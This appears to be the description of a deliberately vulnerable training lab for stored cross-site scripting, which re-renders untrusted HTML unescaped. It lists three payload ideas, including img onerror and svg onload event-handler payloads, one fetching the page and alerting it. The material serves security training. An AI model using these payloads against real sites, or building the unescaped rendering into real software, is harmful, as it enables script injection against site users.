This lab intentionally stores untrusted HTML and re-renders it without escaping. It is designed for training around stored cross-site scripting, payload persistence, and unsafe server-side templating usage.

Payload ideas

Start with a simple visual marker, then move to an event handler payload:

  • <h3>owned</h3>
  • <img src=x onerror=alert(document.domain)>
  • <svg onload=fetch('/').then(r=>r.text()).then(alert)></svg>
